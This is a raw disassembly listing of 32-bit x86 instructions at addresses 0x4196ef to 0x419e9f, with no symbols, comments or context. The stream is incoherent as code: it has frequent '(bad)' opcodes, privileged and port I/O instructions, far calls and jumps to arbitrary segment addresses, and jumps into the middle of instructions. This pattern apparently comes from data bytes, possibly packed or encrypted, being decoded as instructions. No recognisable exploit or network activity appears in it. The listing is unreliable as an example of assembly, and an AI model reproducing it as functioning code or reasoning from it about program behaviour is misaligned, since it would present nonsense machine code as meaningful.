  4196ef:	stos   DWORD PTR es:[edi],eax
  4196f0:	arpl   bx,si
  4196f2:	sub    eax,0xc8cf1909
  4196f7:	push   edi
  4196f8:	add    BYTE PTR [eax],al
  4196fa:	call   0x4f98062a
  4196ff:	fs mov edi,0x999fe5e5
  419705:	push   ebx
  419706:	cld    
  419707:	or     esi,0x3c5464f3
  41970d:	pop    ebp
  41970e:	adc    BYTE PTR [esp+edi*8],bh
  419711:	fidivr DWORD PTR [edx-0x21182502]
  419717:	xchg   BYTE PTR [edx],al
  419719:	fstp   st(3)
  41971b:	and    al,0x68
  41971d:	mov    bl,0x94
  41971f:	add    BYTE PTR [eax+0xf7f0000],dh
  419725:	mov    ebp,0xddcc
  41972a:	fbstp  TBYTE PTR [edi-0x34931231]
  419730:	cmp    bl,ch
  419732:	dec    esp
  419733:	push   0x0
  419735:	add    BYTE PTR [esi+0xf085db4],ch
  41973b:	add    BYTE PTR [eax],al
  41973d:	adc    ebp,edx
  41973f:	xchg   ebx,eax
  419740:	pop    ebx
  419741:	je     0x419730
  419743:	sahf   
  419744:	sub    ah,BYTE PTR [edi-0x58]
  419747:	neg    BYTE PTR [ebx-0x2f]
  41974a:	fidivr DWORD PTR [edx-0x30]
  41974d:	mov    ah,0xc9
  41974f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419750:	cdq    
  419751:	sbb    al,0xe7
  419753:	lds    esi,FWORD PTR [eax-0x34]
  419756:	sti    
  419757:	add    BYTE PTR [eax],al
  419759:	mov    cs,WORD PTR [ecx+0x6f2b9d4e]
  41975f:	add    cl,BYTE PTR [edx]
  419761:	jae    0x41970b
  419763:	pop    esi
  419764:	push   ds
  419765:	add    BYTE PTR [eax+eax*1],dh
  419768:	add    BYTE PTR [esp+ecx*1-0x110f0000],al
  41976f:	add    BYTE PTR [esi+0x0],dl
  419772:	add    ah,al
  419774:	(bad)  
  419775:	add    BYTE PTR [eax],al
  419777:	std    
  419778:	aas    
  419779:	out    dx,al
  41977a:	push   edx
  41977b:	shl    BYTE PTR [edi+0xbc899],1
  419781:	add    BYTE PTR [esi-0x2f],dl
  419784:	call   0x85e93965
  419789:	test   ebx,esi
  41978b:	cmp    cl,BYTE PTR [ebp+0x6da2108f]
  419791:	or     edx,DWORD PTR [edi]
  419793:	or     al,0x22
  419795:	add    BYTE PTR [eax],al
  419797:	icebp  
  419798:	or     BYTE PTR ds:0x4d8b318b,0xc7
  41979f:	ret    0x1ee9
  4197a2:	fs popa 
  4197a4:	retf   
  4197a5:	es stos DWORD PTR es:[edi],eax
  4197a7:	xchg   esp,eax
  4197a8:	mov    WORD PTR [edi],es
  4197aa:	add    BYTE PTR [eax],al
  4197ac:	cld    
  4197ad:	mov    bh,0x46
  4197af:	lods   eax,DWORD PTR ds:[esi]
  4197b0:	inc    esp
  4197b1:	jge    0x4197b3
  4197b3:	add    bh,ch
  4197b5:	pusha  
  4197b6:	call   0x3579:0xf2ec2ee8
  4197bd:	ja     0x419747
  4197bf:	test   eax,0xf350000
  4197c4:	enter  0xc8,0x0
  4197c8:	sub    bh,bl
  4197ca:	loopne 0x419841
  4197cc:	daa    
  4197cd:	(bad)  
  4197cf:	xchg   edx,eax
  4197d0:	icebp  
  4197d1:	add    bh,BYTE PTR [ebp-0x21c9f485]
  4197d7:	std    
  4197d8:	(bad)  
  4197d9:	pop    ss
  4197da:	popf   
  4197db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197dc:	shl    BYTE PTR [edx-0x32284a5e],1
  4197e2:	jns    0x41982f
  4197e4:	loop   0x4197eb
  4197e6:	mov    dl,0x58
  4197e8:	cmovge edx,DWORD PTR [eax+0x36258ed5]
  4197ef:	push   esi
  4197f0:	mov    BYTE PTR [ecx+0x3bec0baa],0xa4
  4197f7:	cmp    bh,0x0
  4197fa:	add    BYTE PTR [edx+0x23bdd26],dl
  419800:	sbb    edi,DWORD PTR [edx-0x47]
  419803:	add    ebx,eax
  419805:	(bad)  
  419806:	sub    al,al
  419808:	add    BYTE PTR fs:[eax],al
  41980b:	test   DWORD PTR [edx],0x14fbe530
  419811:	scas   al,BYTE PTR es:[edi]
  419812:	test   DWORD PTR [edx+0x76],edi
  419815:	cmp    ch,cl
  419817:	sub    al,0x6b
  419819:	outs   dx,DWORD PTR ds:[esi]
  41981a:	sub    DWORD PTR [esi+0x25],esp
  41981d:	and    al,0x8b
  41981f:	fwait
  419820:	cmp    eax,0xcee109b
  419825:	clc    
  419826:	add    BYTE PTR [eax],al
  419828:	mov    dl,0xae
  41982a:	cmp    ah,bl
  41982c:	jne    0x4197af
  41982e:	aas    
  41982f:	jmp    0x4197e0
  419831:	inc    ecx
  419832:	push   ecx
  419833:	push   0xffffffa4
  419835:	push   ss
  419836:	mov    al,0xc7
  419838:	and    DWORD PTR [edx],ebp
  41983a:	mov    DWORD PTR [edx+0x43],esp
  41983d:	inc    ecx
  41983e:	fwait
  41983f:	ret    0xc0b7
  419842:	lods   al,BYTE PTR ds:[esi]
  419843:	add    BYTE PTR [eax],al
  419845:	mov    eax,0xb3887395
  41984a:	add    BYTE PTR [eax],al
  41984c:	outs   dx,DWORD PTR ds:[esi]
  41984d:	test   eax,0x3cbfb298
  419852:	mov    ebp,0xb2753d97
  419857:	inc    ebx
  419858:	mov    al,ds:0x7a446c
  41985d:	add    ah,bh
  41985f:	adc    DWORD PTR [ecx+0x40384f54],0x37
  419866:	add    BYTE PTR [eax],al
  419868:	or     eax,0x1677a65c
  41986d:	push   0xc5dd60f1
  419872:	sbb    DWORD PTR [edx+0x2f],edi
  419875:	xor    edi,DWORD PTR [ecx-0x2fea5b24]
  41987b:	mov    ebx,0xea48
  419880:	popf   
  419881:	xchg   edi,eax
  419882:	xlat   BYTE PTR ds:[ebx]
  419883:	(bad)  
  419884:	ins    DWORD PTR es:[edi],dx
  419885:	sahf   
  419886:	jl     0x419834
  419888:	push   ebp
  419889:	sbb    al,0xe9
  41988b:	xchg   ebx,eax
  41988c:	mov    dh,0xdb
  41988e:	scas   al,BYTE PTR es:[edi]
  41988f:	push   ebx
  419890:	cdq    
  419891:	shr    BYTE PTR [esi+ebx*8-0x6d3d597d],1
  419898:	test   ah,dh
  41989a:	add    BYTE PTR [eax],al
  41989c:	xchg   edx,eax
  41989d:	push   0x2ff458b8
  4198a2:	bound  eax,QWORD PTR es:[edi]
  4198a5:	test   al,0x3b
  4198a7:	shl    DWORD PTR [esi+ecx*2+0x7c2fdd3],cl
  4198ae:	dec    eax
  4198af:	lahf   
  4198b0:	add    BYTE PTR [eax],al
  4198b2:	loope  0x419902
  4198b4:	mov    dl,0x74
  4198b6:	xor    al,0x51
  4198b8:	jne    0x41985d
  4198ba:	push   esp
  4198bb:	arpl   WORD PTR [edi-0x348da34f],di
  4198c1:	xchg   edi,eax
  4198c2:	and    dh,bl
  4198c4:	std    
  4198c5:	push   ebx
  4198c6:	mov    edx,DWORD PTR [ebx-0x1c9d25fb]
  4198cc:	xchg   esp,eax
  4198cd:	dec    DWORD PTR [edi]
  4198cf:	ja     0x419938
  4198d1:	and    al,0xaa
  4198d3:	xor    al,BYTE PTR [eax+0x760000df]
  4198d9:	pop    ds
  4198da:	mov    ebp,0x8f05f950
  4198df:	mov    ds:0xee24d81,eax
  4198e4:	jg     0x4198c7
  4198e6:	sub    DWORD PTR [esi],eax
  4198e8:	jmp    0x6709:0xf782a63e
  4198ef:	test   DWORD PTR [eax+0x5c7e6211],esp
  4198f5:	retf   0xe1c2
  4198f8:	mov    edi,0xb43caf5d
  4198fd:	fs scas al,BYTE PTR es:[edi]
  4198ff:	mov    ecx,0x2908
  419904:	cwde   
  419905:	cld    
  419906:	adc    BYTE PTR [ecx+eax*1-0x32ea0000],cl
  41990d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41990e:	popf   
  41990f:	les    esp,FWORD PTR [esi+0x0]
  419912:	add    BYTE PTR [esi+eax*4],bl
  419915:	popf   
  419916:	mov    eax,0xaeda9f91
  41991b:	sub    al,0xb0
  41991d:	inc    esp
  41991e:	aad    0x0
  419920:	add    ah,al
  419922:	cmc    
  419923:	add    BYTE PTR [eax],al
  419925:	pop    edx
  419926:	sub    ebp,esp
  419928:	xchg   esp,eax
  419929:	cwde   
  41992a:	aas    
  41992b:	inc    esp
  41992c:	int    0x0
  41992e:	add    BYTE PTR [ecx-0xd],dl
  419931:	or     BYTE PTR [edi],cl
  419933:	add    BYTE PTR [eax],al
  419935:	outs   dx,DWORD PTR ds:[esi]
  419936:	pushf  
  419937:	push   eax
  419938:	push   es
  419939:	ret    0x62ae
  41993c:	in     eax,dx
  41993d:	xchg   cl,al
  41993f:	xchg   esp,eax
  419940:	je     0x4199a7
  419942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419943:	into   
  419944:	addr16 adc eax,0xa1d2e20
  41994a:	stc    
  41994b:	dec    edx
  41994c:	push   ss
  41994d:	cli    
  41994e:	mov    ecx,ss
  419950:	add    BYTE PTR [eax],al
  419952:	imul   esi,DWORD PTR [eax],0xfffffffb
  419955:	push   ds
  419956:	or     DWORD PTR [esi+0x68263d21],0xc0bb5552
  419960:	pop    edi
  419961:	add    BYTE PTR [eax],al
  419963:	pop    ebx
  419964:	loopne 0x419927
  419966:	loop   0x419986
  419968:	and    BYTE PTR [esi-0x4c],dh
  41996b:	int    0xd1
  41996d:	call   DWORD PTR [ebp+0x72]
  419970:	(bad)  
  419972:	push   eax
  419973:	mov    ah,0xe4
  419975:	xchg   ebx,eax
  419976:	mov    al,ds:0x54e6eb7
  41997b:	nop
  41997c:	loopne 0x41999d
  41997e:	test   BYTE PTR [edx+0x17ab0000],dl
  419984:	inc    eax
  419985:	mov    esi,0xbde0000
  41998a:	mov    bh,0x67
  41998c:	pop    es
  41998d:	jl     0x4199f4
  41998f:	ss ins BYTE PTR es:[edi],dx
  419991:	fwait
  419992:	jl     0x4199a7
  419994:	inc    edx
  419995:	mov    bl,al
  419997:	ret    0x9824
  41999a:	rcr    bl,cl
  41999c:	or     eax,0x2d7cdad9
  4199a1:	call   0x4a60772c
  4199a6:	mov    eax,ds:0x4cf48a32
  4199ab:	or     eax,0x27b90000
  4199b0:	fld    TBYTE PTR [ebx]
  4199b2:	sbb    bh,BYTE PTR [ecx+ebx*2-0x12780199]
  4199b9:	sbb    eax,edx
  4199bb:	shl    DWORD PTR ds:0x7ad78550,1
  4199c1:	push   ebp
  4199c2:	adc    BYTE PTR [edi],ch
  4199c4:	sbb    ebp,edx
  4199c6:	retf   0x6281
  4199c9:	mov    al,0x46
  4199cb:	cmp    edx,DWORD PTR [eax-0x75]
  4199ce:	pushf  
  4199cf:	fnsave [edx+ebp*1-0x2578596c]
  4199d6:	(bad)  
  4199d7:	sbb    ah,BYTE PTR [ebp+0x3e85a970]
  4199dd:	in     eax,0xe3
  4199df:	lahf   
  4199e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e1:	mov    ds:0xd300b191,eax
  4199e6:	add    BYTE PTR [eax],al
  4199e8:	mov    WORD PTR [esi+0x2a030000],ss
  4199ee:	pop    edi
  4199ef:	stc    
  4199f0:	(bad)  
  4199f1:	jne    0x419a5c
  4199f3:	popa   
  4199f4:	push   ds
  4199f5:	lods   al,BYTE PTR ds:[esi]
  4199f6:	int    0x19
  4199f8:	jae    0x4199be
  4199fa:	add    DWORD PTR [eax],eax
  4199fc:	add    BYTE PTR [edx],cl
  4199fe:	sbb    eax,0x32001520
  419a03:	add    BYTE PTR [eax],al
  419a05:	and    dl,al
  419a07:	pop    es
  419a08:	hlt    
  419a09:	mov    edi,0xd132c689
  419a0e:	dec    ebp
  419a0f:	popf   
  419a10:	xchg   esi,eax
  419a11:	repz sbb eax,0xd3e5fb28
  419a17:	mov    ch,0x2e
  419a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a1a:	outs   dx,DWORD PTR ds:[esi]
  419a1b:	sar    BYTE PTR [eax],0x0
  419a1e:	add    ah,cl
  419a20:	cmp    eax,DWORD PTR [eax]
  419a22:	add    al,dl
  419a24:	xchg   esp,eax
  419a25:	out    0xf4,al
  419a27:	mov    ecx,0x530e20a4
  419a2c:	and    al,0xa7
  419a2e:	jbe    0x4199d5
  419a30:	cdq    
  419a31:	mov    WORD PTR [ecx+0x17ac0000],es
  419a37:	lock fs sub al,0x32
  419a3b:	dec    ecx
  419a3c:	aas    
  419a3d:	xchg   esp,eax
  419a3e:	inc    ebp
  419a3f:	mov    esi,0xe93164d0
  419a44:	sub    eax,0x1b4ff23b
  419a49:	sahf   
  419a4a:	stos   BYTE PTR es:[edi],al
  419a4b:	xchg   esi,eax
  419a4c:	xor    BYTE PTR [edi-0x23d51683],0xc6
  419a53:	push   eax
  419a54:	inc    ecx
  419a55:	and    eax,eax
  419a57:	jg     0x419a59
  419a59:	add    cl,bh
  419a5b:	mov    al,0x59
  419a5d:	mov    cl,0xf1
  419a5f:	dec    esp
  419a60:	dec    esi
  419a61:	add    BYTE PTR [eax],al
  419a63:	jmp    0x4199ef
  419a65:	inc    esp
  419a66:	dec    esp
  419a67:	add    BYTE PTR [eax],al
  419a69:	fwait
  419a6a:	add    BYTE PTR [esi],0x0
  419a6d:	add    BYTE PTR ds:0x90faa11c,dh
  419a73:	jno    0x419ad1
  419a75:	ror    DWORD PTR [edi],cl
  419a77:	push   edx
  419a78:	mov    ds:0x50beff6c,eax
  419a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a7e:	mov    dh,0x48
  419a80:	cmp    al,BYTE PTR [eax]
  419a82:	add    BYTE PTR [edi+0x2c],dh
  419a85:	into   
  419a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a87:	ret    
  419a88:	xlat   BYTE PTR ds:[ebx]
  419a89:	mov    ebx,0xdc5df4d7
  419a8e:	sub    BYTE PTR [edx+0x43c8],dl
  419a94:	adc    ah,BYTE PTR [eax+0x8608fc]
  419a9a:	add    BYTE PTR [ecx],dl
  419a9c:	ja     0x419ae1
  419a9e:	loop   0x419af0
  419aa0:	lods   eax,DWORD PTR ds:[esi]
  419aa1:	xchg   ebx,eax
  419aa2:	jecxz  0x419b0a
  419aa4:	sti    
  419aa5:	pop    ds
  419aa6:	cmp    eax,0x8f4ed0d8
  419aab:	or     al,BYTE PTR [esi]
  419aad:	rcr    BYTE PTR ss:[ecx+eiz*2-0x259b6491],1
  419ab5:	mov    ebx,0xafa825e9
  419aba:	lods   eax,DWORD PTR ds:[esi]
  419abb:	mov    ah,0x93
  419abd:	xchg   esi,eax
  419abe:	jge    0x419a89
  419ac0:	sbb    edi,0xb3ba4a6
  419ac6:	jecxz  0x419b43
  419ac8:	add    eax,0x7ed8d1aa
  419acd:	push   0xb080b053
  419ad2:	add    BYTE PTR [eax],al
  419ad4:	cdq    
  419ad5:	dec    ebp
  419ad6:	dec    eax
  419ad7:	pop    ebx
  419ad8:	add    BYTE PTR [eax],al
  419ada:	iret   
  419adb:	jne    0x419af1
  419add:	mov    esi,0x96c8222e
  419ae2:	add    BYTE PTR [eax],al
  419ae4:	outs   dx,BYTE PTR ds:[esi]
  419ae5:	dec    ebx
  419ae6:	fsubr  st,st(7)
  419ae8:	sbb    ebp,DWORD PTR [eax]
  419aea:	cmp    BYTE PTR ds:0xffe9f36e,cl
  419af0:	out    dx,eax
  419af1:	pop    ebp
  419af2:	aas    
  419af3:	jmp    0x419a9f
  419af5:	xlat   BYTE PTR ds:[ebx]
  419af6:	pop    esi
  419af7:	test   eax,0xdba460ad
  419afc:	jmp    0x419aff
  419afe:	cmc    
  419aff:	mov    dh,0xc8
  419b01:	add    BYTE PTR gs:[eax],al
  419b04:	jbe    0x419ac1
  419b06:	xchg   esi,eax
  419b07:	stc    
  419b08:	or     ebx,esp
  419b0a:	loop   0x419acd
  419b0c:	and    BYTE PTR [edx-0x99cd2ef],ch
  419b12:	xor    BYTE PTR [ebx+0x0],0x0
  419b16:	mov    ds:0xec3e2e47,eax
  419b1b:	sbb    ebp,DWORD PTR [esi-0x2b]
  419b1e:	mov    ebp,0x2e026921
  419b23:	shl    BYTE PTR [edx+0x7644bc2b],cl
  419b29:	add    BYTE PTR [eax],al
  419b2b:	popa   
  419b2c:	test   BYTE PTR [eax],dh
  419b2e:	add    BYTE PTR [eax],al
  419b30:	lea    ebp,[edi+0x2a1a0201]
  419b36:	inc    esi
  419b37:	nop
  419b38:	pop    esi
  419b39:	cmp    BYTE PTR [edx],dl
  419b3b:	or     dh,BYTE PTR [ebp-0x6e8c1ca8]
  419b41:	enter  0x30,0x0
  419b45:	xchg   edx,eax
  419b46:	out    0x6d,al
  419b48:	fmul   DWORD PTR [eax]
  419b4a:	rol    DWORD PTR [eax],cl
  419b4c:	add    BYTE PTR [ebp+0xe9cc34],dl
  419b52:	add    BYTE PTR [edi],al
  419b54:	mov    esi,0xa00ddca3
  419b59:	retf   
  419b5a:	cmp    al,0x90
  419b5c:	icebp  
  419b5d:	je     0x419bdb
  419b5f:	adc    eax,0xe028b2f1
  419b64:	ret    0x201c
  419b67:	mov    ebx,DWORD PTR [esi+0x66e89c19]
  419b6d:	or     al,0xc0
  419b6f:	add    BYTE PTR [eax],al
  419b71:	clc    
  419b72:	mov    bh,0x7c
  419b74:	xor    dl,BYTE PTR [esi+0x5b]
  419b77:	or     al,0x47
  419b79:	add    BYTE PTR [eax],al
  419b7b:	data16 xchg BYTE PTR [edi+0xb4560af],al
  419b82:	sub    dl,al
  419b84:	jle    0x419bb7
  419b86:	dec    edi
  419b87:	dec    ecx
  419b88:	test   ebx,edi
  419b8a:	xchg   edx,eax
  419b8b:	and    cl,0x0
  419b8e:	add    BYTE PTR [edx],bl
  419b90:	sbb    eax,DWORD PTR [ebp-0x72]
  419b93:	push   ebp
  419b94:	adc    al,0x31
  419b96:	pushf  
  419b97:	mov    ds:0xa1792b3a,al
  419b9c:	loop   0x419b3c
  419b9e:	xlat   BYTE PTR ds:[ebx]
  419b9f:	inc    ebx
  419ba0:	dec    edx
  419ba1:	push   0x646cd657
  419ba6:	mov    ch,0x2a
  419ba8:	popa   
  419ba9:	lock xlat BYTE PTR ds:[ebx]
  419bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bac:	pop    ebp
  419bad:	mov    edx,0x81beec79
  419bb2:	adc    BYTE PTR [ebx-0x21],dl
  419bb5:	cmc    
  419bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb7:	imul   eax,edx,0x3b96cba7
  419bbd:	pop    esp
  419bbe:	xchg   ebx,eax
  419bbf:	test   al,0x76
  419bc1:	iret   
  419bc2:	shl    ecx,1
  419bc4:	call   0x47c1bcde
  419bc9:	add    BYTE PTR [eax],al
  419bcb:	and    edx,DWORD PTR [edi+0x1]
  419bce:	int3   
  419bcf:	push   esi
  419bd0:	add    BYTE PTR [eax],al
  419bd2:	out    dx,al
  419bd3:	sub    BYTE PTR [edi+edx*1],ch
  419bd6:	cmc    
  419bd7:	mov    ebp,0xba985afc
  419bdc:	fadd   QWORD PTR [esi-0x23]
  419bdf:	inc    eax
  419be0:	stos   DWORD PTR es:[edi],eax
  419be1:	add    BYTE PTR [eax],al
  419be3:	call   0xaebe352a
  419be8:	daa    
  419be9:	sub    ch,BYTE PTR [ecx-0x32c2bd5d]
  419bef:	mov    eax,0x6bde7b1b
  419bf4:	inc    edx
  419bf5:	rcl    eax,cl
  419bf7:	(bad)  
  419bf9:	ja     0x419bbe
  419bfb:	repz jle 0x419b96
  419bfe:	aad    0x2f
  419c00:	cld    
  419c01:	pop    ecx
  419c02:	mov    ds:0x5b3f5ac1,eax
  419c07:	data16 ja 0x419bbc
  419c0a:	icebp  
  419c0b:	push   ss
  419c0c:	mov    ch,0x34
  419c0e:	std    
  419c0f:	adc    ah,BYTE PTR [esi-0x66]
  419c12:	mov    eax,ds:0x7a301845
  419c17:	(bad)  
  419c18:	mov    BYTE PTR [ebp+0x0],dh
  419c1b:	add    BYTE PTR [edi-0x7ea22677],bl
  419c21:	add    edi,0x34036f3
  419c27:	add    BYTE PTR [eax],al
  419c29:	mov    cl,0x28
  419c2b:	pop    eax
  419c2c:	dec    ebp
  419c2d:	fnstenv [edi]
  419c2f:	push   eax
  419c30:	mov    bh,0x35
  419c32:	ss jecxz 0x419be6
  419c35:	out    dx,eax
  419c36:	fsub   QWORD PTR [edi]
  419c38:	adc    eax,0xbd053882
  419c3d:	fdivr  QWORD PTR [edx-0x387c2d14]
  419c43:	push   esi
  419c44:	cmc    
  419c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c46:	mov    es,WORD PTR [edi+0x1b]
  419c49:	cdq    
  419c4a:	jle    0x419be9
  419c4c:	cmp    bh,BYTE PTR [eax]
  419c4e:	jmp    DWORD PTR [eax]
  419c50:	and    al,dh
  419c52:	loop   0x419c4e
  419c54:	mov    cl,0x92
  419c56:	mov    ch,0x13
  419c58:	das    
  419c59:	push   ss
  419c5a:	sbb    BYTE PTR [esi+0x56],cl
  419c5d:	lahf   
  419c5e:	pop    ecx
  419c5f:	js     0x419cb9
  419c61:	popf   
  419c62:	fst    QWORD PTR [eax+esi*8]
  419c65:	inc    BYTE PTR ss:0x125aaed4
  419c6c:	mov    eax,ds:0xd2358542
  419c71:	outs   dx,DWORD PTR ds:[esi]
  419c72:	pop    es
  419c73:	data16 test al,0x52
  419c76:	aaa    
  419c77:	sbb    ebx,DWORD PTR [ebx+0x76]
  419c7a:	adc    ebp,DWORD PTR [ecx-0x4d]
  419c7d:	mov    dl,0x9b
  419c7f:	jp     0x419c20
  419c81:	jno    0x419cbb
  419c83:	fidivr WORD PTR [edi]
  419c85:	xlat   BYTE PTR ds:[ebx]
  419c86:	pop    esp
  419c87:	call   0xe8e1:0xc6a22715
  419c8e:	lahf   
  419c8f:	or     DWORD PTR [esi-0x35eeadb1],edi
  419c95:	aam    0x11
  419c97:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c99:	(bad)  
  419c9a:	cmp    eax,0x7c5282d6
  419c9f:	icebp  
  419ca0:	in     eax,dx
  419ca1:	push   0xe7fa4ed2
  419ca6:	mov    ds:0x80eb8eb3,al
  419cab:	inc    edx
  419cac:	add    BYTE PTR [eax],al
  419cae:	mov    ebp,0x7b7b3746
  419cb3:	loop   0x419cb1
  419cb5:	mov    dh,cl
  419cb7:	add    BYTE PTR [eax],al
  419cb9:	xchg   esi,eax
  419cba:	icebp  
  419cbb:	gs xchg ecx,eax
  419cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbe:	test   BYTE PTR [ebp+0x64650000],ch
  419cc4:	ret    0xafad
  419cc7:	and    BYTE PTR [eax+0x0],0x0
  419ccb:	dec    esi
  419ccc:	getsec 
  419cce:	es jle 0x419cb3
  419cd1:	inc    ebx
  419cd2:	ret    0x3155
  419cd5:	ficomp WORD PTR [esi-0x63956a60]
  419cdb:	loope  0x419cb4
  419cdd:	shl    DWORD PTR [ebp+0x2ecc],0x28
  419ce4:	aas    
  419ce5:	inc    eax
  419ce6:	pushf  
  419ce7:	add    BYTE PTR [eax],al
  419ce9:	pop    esi
  419cea:	pusha  
  419ceb:	pop    eax
  419cec:	mov    ah,0xc8
  419cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cef:	add    BYTE PTR [eax],al
  419cf1:	inc    esi
  419cf2:	pop    esp
  419cf3:	mov    dh,0x3f
  419cf5:	neg    DWORD PTR [ecx-0x6d]
  419cf8:	push   esi
  419cf9:	adc    BYTE PTR [esi+0x6831dddc],dh
  419cff:	shr    eax,1
  419d01:	aam    0x3
  419d03:	push   edx
  419d04:	dec    ecx
  419d05:	ins    DWORD PTR es:[edi],dx
  419d06:	jge    0x419c8a
  419d08:	xchg   ebp,eax
  419d09:	push   esi
  419d0a:	gs mov esp,0x7d9ccf1e
  419d10:	adc    BYTE PTR [edx+0x4622b85c],al
  419d16:	ds push ss
  419d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d19:	inc    eax
  419d1a:	cwde   
  419d1b:	add    BYTE PTR [eax],al
  419d1d:	cld    
  419d1e:	leave  
  419d1f:	pop    edx
  419d20:	adc    DWORD PTR [eax],0xf
  419d23:	not    DWORD PTR [edi+esi*4+0x6dd92c68]
  419d2a:	cmp    bh,BYTE PTR [eax-0xc6c762]
  419d30:	pop    ebx
  419d31:	add    esp,DWORD PTR [eax]
  419d33:	jnp    0x419cb9
  419d35:	jp     0x419d37
  419d37:	add    BYTE PTR ds:0x9e668583,ah
  419d3d:	xlat   BYTE PTR ds:[ebx]
  419d3e:	push   0x23912a05
  419d43:	push   0x3027b57c
  419d48:	out    dx,al
  419d49:	imul   DWORD PTR [edx]
  419d4b:	mov    DWORD PTR [edx+esi*4+0x6a],edi
  419d4f:	mov    eax,0x64299cce
  419d54:	and    ebx,esp
  419d56:	pop    ebp
  419d57:	out    0x3e,eax
  419d59:	or     al,0x0
  419d5c:	add    dl,dh
  419d5e:	mov    cl,0x8b
  419d60:	arpl   WORD PTR [edx-0x4e2d5c48],bx
  419d66:	shl    DWORD PTR [ecx],1
  419d68:	bound  esp,QWORD PTR [eax+ebp*1-0xc]
  419d6c:	pop    eax
  419d6d:	shl    DWORD PTR [edx],1
  419d6f:	push   ecx
  419d70:	push   eax
  419d71:	push   eax
  419d72:	xchg   edi,eax
  419d73:	adc    BYTE PTR cs:[ebp-0x2b4b8257],cl
  419d7a:	addr16 xor eax,0x1605d81a
  419d80:	add    edx,DWORD PTR [edx-0x7298c19b]
  419d86:	or     BYTE PTR [edi+0x0],dh
  419d89:	add    BYTE PTR [edx-0x448e6827],bl
  419d8f:	pusha  
  419d90:	push   ebx
  419d91:	nop
  419d92:	leave  
  419d93:	out    0x5e,eax
  419d95:	xchg   BYTE PTR [eax+eax*8+0x1d00004a],ah
  419d9c:	ss test eax,0x170f9096
  419da2:	shl    DWORD PTR [ebp+0x7030db54],1
  419da8:	push   edx
  419da9:	mov    eax,0xd744
  419dae:	sub    DWORD PTR [ebx],esi
  419db0:	fnstsw WORD PTR gs:[edi]
  419db3:	mov    al,ds:0x57145b92
  419db8:	push   eax
  419db9:	aam    0x57
  419dbb:	aas    
  419dbc:	scas   al,BYTE PTR es:[edi]
  419dbd:	in     al,0xe7
  419dbf:	push   ss
  419dc0:	or     dl,dh
  419dc2:	jecxz  0x419e42
  419dc4:	test   DWORD PTR ds:0x17db09fb,ecx
  419dca:	rcl    DWORD PTR [ebx],1
  419dcc:	(bad)  
  419dcd:	push   edx
  419dce:	dec    esp
  419dcf:	pop    ebx
  419dd0:	add    BYTE PTR [eax],al
  419dd2:	loopne 0x419da8
  419dd4:	mov    BYTE PTR [ebp+0x0],dh
  419dd7:	add    al,dh
  419dd9:	das    
  419dda:	sub    ebp,0x18f6a5b3
  419de0:	mov    edx,0xa20a5f78
  419de5:	ror    DWORD PTR [ecx-0x40],cl
  419de8:	sub    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [edx],ch
  419dec:	mov    ebp,0xba853425
  419df1:	inc    ebx
  419df2:	jl     0x419dcb
  419df4:	adc    eax,ebp
  419df6:	and    DWORD PTR ds:0x225db4af,edx
  419dfc:	adc    al,BYTE PTR [ebx]
  419dfe:	pop    ebp
  419dff:	into   
  419e00:	rcpps  xmm2,XMMWORD PTR [edi-0x3192d75e]
  419e07:	and    ebx,DWORD PTR [ecx-0x7c]
  419e0a:	daa    
  419e0b:	add    BYTE PTR [eax],al
  419e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0e:	imul   ebx,DWORD PTR [esi+0x629179c7],0x7a040e
  419e18:	add    BYTE PTR [ebp-0x57],bl
  419e1b:	daa    
  419e1c:	clc    
  419e1d:	inc    BYTE PTR [eax-0x5b]
  419e20:	add    BYTE PTR [eax],al
  419e22:	xchg   ebx,eax
  419e23:	mov    dl,ah
  419e25:	add    BYTE PTR [eax],al
  419e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e28:	dec    BYTE PTR [ecx-0x7d]
  419e2b:	imul   ecx,edi,0xffffff8b
  419e2e:	fcom   st(6)
  419e30:	push   ebp
  419e31:	js     0x419e86
  419e33:	mov    al,ds:0xf23351cf
  419e38:	pop    eax
  419e39:	rcr    DWORD PTR [ebp+0x5c],cl
  419e3c:	or     cl,BYTE PTR ds:0xa2142c43
  419e42:	push   cs
  419e43:	sar    esi,cl
  419e45:	ja     0x419ea6
  419e47:	aaa    
  419e48:	imul   ebp,DWORD PTR [ecx],0x20
  419e4b:	and    cl,BYTE PTR [ebx+edx*4+0x76970000]
  419e52:	xor    DWORD PTR [ebx-0x2e493657],eax
  419e58:	add    eax,0x766711a9
  419e5d:	data16 outs dx,BYTE PTR ds:[esi]
  419e5f:	xchg   ebp,eax
  419e60:	fnstenv [eax+0x786b52f2]
  419e66:	fcomp  QWORD PTR [edx+0x1b]
  419e69:	call   0x5d98:0xf05518d0
  419e70:	bound  ebp,QWORD PTR [ebp*4-0x10ab61ff]
  419e77:	xchg   BYTE PTR [esp+edi*4-0x3a],ch
  419e7b:	stc    
  419e7c:	nop
  419e7d:	arpl   WORD PTR [ecx],si
  419e7f:	sbb    DWORD PTR [ebx-0x3],0x8f133e1f
  419e86:	inc    BYTE PTR [esi+0x7840]
  419e8c:	cmp    al,0x35
  419e8e:	stc    
  419e8f:	xchg   edx,eax
  419e90:	hlt    
  419e91:	call   0x5a65a0fd
  419e96:	les    edi,FWORD PTR [ebp+0x0]
  419e99:	add    BYTE PTR [ecx],cl
  419e9b:	or     al,0x4d
  419e9d:	add    BYTE PTR [eax],al
  419e9f:	stc    
